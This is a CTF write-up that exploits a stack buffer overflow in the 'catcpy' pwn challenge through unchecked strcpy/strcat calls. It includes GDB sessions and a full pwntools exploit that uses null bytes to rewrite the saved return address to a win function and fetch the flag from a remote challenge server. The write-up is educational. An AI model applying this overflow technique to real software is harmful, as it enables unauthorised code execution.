# catcpy

<details><summary><strong>Table of Contents</strong></summary>

- [Overview](#overview)
- [Background](#background)
- [Enumeration](#enumeration)
- [Exploitation](#exploitation)
- [Conclusion](#conclusion)

</details>

## Overview

- 41 solves / 148 points
- Author: @ptr-yudai
- Overall difficulty for me (From 1-10 stars): ★★★★★★☆☆☆☆

## Background

`strcat` and `strcpy` are typical functions used in C textbooks.

## Enumeration

**In this challenge, we can download a [file](https://github.com/siunam321/CTF-Writeups/blob/main/AlpacaHack-Round-6-Pwn/catcpy/catcpy.tar.gz):**
```shell
┌[siunam♥Mercury]-(~/ctf/AlpacaHack-Round-6-(Pwn)/catcpy)-[2024.11.04|13:32:05(HKT)]
└> file catcpy.tar.gz 
catcpy.tar.gz: gzip compressed data, from Unix, original size modulo 2^32 30720
┌[siunam♥Mercury]-(~/ctf/AlpacaHack-Round-6-(Pwn)/catcpy)-[2024.11.04|13:32:10(HKT)]
└> tar xvfz catcpy.tar.gz 
catcpy/
catcpy/Dockerfile
catcpy/main.c
catcpy/catcpy
catcpy/compose.yml
```

`catcpy/catcpy`:

```shell
┌[siunam♥Mercury]-(~/ctf/AlpacaHack-Round-6-(Pwn)/catcpy)-[2024.11.04|13:32:12(HKT)]
└> cd catcpy                                 
┌[siunam♥Mercury]-(~/ctf/AlpacaHack-Round-6-(Pwn)/catcpy/catcpy)-[2024.11.04|13:32:37(HKT)]
└> file catcpy       
catcpy: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=33f04f4bd45554ad7f1e9136aabe4bfceb98e814, for GNU/Linux 3.2.0, not stripped
```

As we can see, `catcpy` is a 64-bit ELF executable binary.

Memory protection:

```shell
┌[siunam♥Mercury]-(~/ctf/AlpacaHack-Round-6-(Pwn)/catcpy/catcpy)-[2024.11.04|13:32:39(HKT)]
└> pwn checksec ./catcpy 
[...]
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
```

- RELRO: Partial RELRO, which means the GOT table can be overwritten
- Stack: No canary, which means we don't need to worry about leaking the canary
- NX: NX enabled, which means the stack is not executable
- PIE: No PIE, which means the base address is fixed (`0x400000`)

Let's try to run the binary to have a high-level overview of this challenge!

```shell
┌[siunam♥Mercury]-(~/ctf/AlpacaHack-Round-6-(Pwn)/catcpy/catcpy)-[2024.11.04|13:34:22(HKT)]
└> ./catcpy 
1. strcpy
2. strcat
> 
```

In here, we can perform string operations via [`strcpy`](https://man7.org/linux/man-pages/man3/strcat.3.html) and [`strcat`](https://man7.org/linux/man-pages/man3/strcat.3p.html):

```shell
> 1
Data: foo
> 2
Data: bar
> 
```

Let's read this program's source code, `main.c`, to understand it better!

Function `win`:

```c
/* Call this function! */
void win() {
  char *args[] = {"/bin/cat", "/flag.txt", NULL};
  execve(args[0], args, NULL);
  exit(1);
}
```

In this challenge, we need to somehow **call function `win`** to read the flag file.

Function `main`:

```c
char g_buf[0x100];
[...]
void get_data() {
  printf("Data: ");
  fgets(g_buf, sizeof(g_buf), stdin);
}
[...]
int main() {
  int choice;
  char buf[0x100];
  [...]
  while (1) {
    printf("> ");
    if (scanf("%d%*c", &choice) != 1) return 1;

    switch (choice) {
      case 1:
        get_data();
        strcpy(buf, g_buf);
        break;

      case 2:
        get_data();
        strcat(buf, g_buf);
        break;

      default:
        return 0;
    }
  }
}
```

In this `main` function, it'll copy (`strcpy`) and concatenate (`strcat`) from `g_buf` to `buf`. However, the function **didn't check the source length in both `strcpy` and `strcat`**, which means this function is **vulnerable to buffer overflow**.

To test this, we can use GDB to start debugging:

```shell
┌[siunam♥Mercury]-(~/ctf/AlpacaHack-Round-6-(Pwn)/catcpy/catcpy)-[2024.11.04|13:57:38(HKT)]
└> gdb ./catcpy 
[...]
gef➤  disassemble main
Dump of assembler code for function main:
   [...]
   0x0000000000401361 <+130>:	call   0x401100 <printf@plt>
   [...]
gef➤  b *main+130
Breakpoint 1 at 0x401361
gef➤  r
[...]
Breakpoint 1, 0x0000000000401361 in main ()
[...]
gef➤  c
Continuing.
> 
```

```shell
┌[siunam♥Mercury]-(~/ctf/AlpacaHack-Round-6-(Pwn)/catcpy)-[2024.11.04|14:07:25(HKT)]
└> python3 -c 'print("A" * (0x100 - 1))'           
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
┌[siunam♥Mercury]-(~/ctf/AlpacaHack-Round-6-(Pwn)/catcpy)-[2024.11.04|14:07:34(HKT)]
└> python3 -c 'print("B" * 32)'        
BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB
```

> Note: `strcpy` and `strcat` will append a newline character at the end, thus we need to provide 255 (0x100 - 1) characters.

```shell
> 1
Data: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA

Breakpoint 1, 0x0000000000401361 in main ()
[...]
gef➤  
Continuing.
> 2
Data: BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB

Breakpoint 1, 0x0000000000401361 in main ()
[...]
gef➤  c
Continuing.
> 
```

Wait, why it didn't raise segmentation fault?

If we take a look at function `main`, when we input character other than `1` and `2`, the function will `return 0`:

```c
int main() {
  [...]
  while (1) {
    [...]
    switch (choice) {
      case 1:
        [...]
      case 2:
        [...]
      default:
        return 0;
    }
  }
}
```

In x64 assembly, the `return` will translate to instructions like this:

```asm
leave
ret
```

In instruction `leave`, it sets RSP to RBP, then pop top of stack into RBP. In instruction `ret`, it pops return address from stack and jump there:

```asm
; leave
mov rsp, rbp
pop rbp
; ret
pop rip
```

With that said, we can trigger the stack buffer overflow by inputting characters that are not `1` and `2`:

```shell
> Z 

Program received signal SIGSEGV, Segmentation fault.
0x00000000004013f3 in main ()
[...]
───────────────────────────────────────────────────────────── stack ────
0x00007fffffffd988│+0x0000: "BBBBBBB\n"	 ← $rsp
[...]
─────────────────────────────────────────────────────── code:x86:64 ────
[...]
     0x4013f2 <main+0113>      leave  
 →   0x4013f3 <main+0114>      ret    
```

Since we have overflown the stack, the `ret` instruction is trying to set RIP with the value on the top of the stack (`pop rip`) and jump to there. But value `BBBBBBB\n` is not a valid address, thus the program occurred segmentation fault.

Now we confirmed that the program does have stack buffer overflow vulnerability, we can try to overwrite the RIP to function `win` address.

## Exploitation

To debug it more effectively, I'll be using pwntools:

```python
#!/usr/bin/env python3
from pwn import *

binaryPath = './catcpy'
elf = context.binary = ELF(binaryPath)
p = process(binaryPath)

# main+263: mov eax, 0x0
gdbScript = '''
b *main+263
'''
gdb.attach(p, gdbscript=gdbScript)

def strcpy(payload):
    p.sendlineafter(b'> ', b'1')
    p.sendlineafter(b'Data: ', payload)

def strcat(payload):
    p.sendlineafter(b'> ', b'2')
    p.sendlineafter(b'Data: ', payload)

def returnToOverflow():
    p.sendlineafter(b'> ', b'Z')

# overflow the stack up to the rip
offset1 = 0x100 - 1
PADDING1 = b'A' * offset1
strcpy(PADDING1)
offset2 = 24
PADDING2 = b'A' * offset2
strcat(PADDING2)

WIN = elf.symbols['win']
log.success('win symbol address: %s', hex(WIN))

payload = flat(
    b'B' * 11,
    WIN
)
strcat(payload)

returnToOverflow()
p.interactive()
```

When we run this, we can see the following:

```shell
gef➤  c
Continuing.

Program received signal SIGSEGV, Segmentation fault.
0x00007f4000401256 in ?? ()
[...]
──────────────────────────────────────────────────── code:x86:64 ────
[...]
[!] Cannot access memory at address 0x7f4000401256
[...]
```

As we can see, function `win` address is 3 bytes long. However, the RIP contains other bytes.

Hmm... Are there methods to remove those annoying bytes?

Yes we can!

Since `strcpy` and `strcat` are null-terminate, we can use **null byte** to remove those bytes like this:

```
Original:        0x00007ffff7de8200
    |
    v
Input BBBBB\x00: 0x0000004242424242
    |
    v
Input BBBB\x00:  0x0000000042424242
    |
    v
Input BBB\x00:   0x0000000000424242
```

Armed with the above information, we can write a Python solve script to read the flag!

<details><summary><strong>solve.py</strong></summary>

```python
#!/usr/bin/env python3
from pwn import *

binaryPath = './catcpy'
elf = context.binary = ELF(binaryPath)
# p = process(binaryPath)
p = remote('34.170.146.252', 13997)

gdbScript = '''
b *main+130
c
c
c
'''
# gdb.attach(p, gdbscript=gdbScript)

def strcpy(payload):
    p.sendlineafter(b'> ', b'1')
    p.sendlineafter(b'Data: ', payload)

def strcat(payload):
    p.sendlineafter(b'> ', b'2')
    p.sendlineafter(b'Data: ', payload)

def returnToOverflow():
    p.sendlineafter(b'> ', b'Z')

WIN = elf.symbols['win']
log.success('win symbol address: %s', hex(WIN))

# overflow the stack up to the rip
offset1 = 0x100 - 1
PADDING1 = b'A' * offset1
strcpy(PADDING1)
offset2 = 24
PADDING2 = b'A' * offset2
strcat(PADDING2)

# memory dump:
# 0x7fffffffd970:	0x4141414141414141	0x4141414141414141
# 0x7fffffffd980:	0x0a41414141414141	0x00007ffff7de8200
# rip = 0x00007ffff7de8200

# now we're deleting the previous rip via strcat payload's null byte
payload = flat(
    b'B' * 16,
    b'\x00' # delete the 6th byte
)
strcat(payload)

# memory dump:
# 0x7fffffffd970:	0x4141414141414141	0x4141414141414141
# 0x7fffffffd980:	0x0a41414141414141	0x0000004242424242
# rip = 0x0000004242424242

payload = flat(
    b'B' * 15,
    b'\x00' # delete the 5th byte
)
strcat(payload)

# memory dump:
# 0x7fffffffd970:	0x4141414141414141	0x4242420241414141
# 0x7fffffffd980:	0x4242424242424242	0x0000000042424242
# rip = 0x0000000042424242

payload = flat(
    b'B' * 14,
    b'\x00' # delete the 4th byte
)
strcat(payload)

# memory dump:
# 0x7fffffffd970:	0x4141414141414141	0x4242420241414141
# 0x7fffffffd980:	0x4242424242424242	0x0000000000424242
# rip = 0x0000000000424242

# now the stack is aligned, we can overwrite the rip with the win symbol address
payload = flat(
    b'C' * 11,
    WIN
)
strcat(payload)

# memory dump:
# 0x7fffffffd970:	0x4141414141414141	0x4242420241414141
# 0x7fffffffd980:	0x4242424242424242	0x0000000000401256
# rip = 0x0000000000401256

# return to trigger our overwritten rip address
returnToOverflow()
p.interactive()
```

</details>

```shell
┌[siunam♥Mercury]-(~/ctf/AlpacaHack-Round-6-(Pwn)/catcpy/catcpy)-[2024.11.04|15:40:27(HKT)]
└> python3 solve.py            
[...]
[+] win symbol address: 0x401256
[...]
Alpaca{4_b4sic_func_but_n0t_4_b4s1c_3xp101t}
```

- **Flag: `Alpaca{4_b4sic_func_but_n0t_4_b4s1c_3xp101t}`**

> Note: If you want to see the deletion in action, you can attach the script to GDB and view the stack.

## Conclusion

What we've learned:

1. Stack buffer overflow via `strcpy` and `strcat`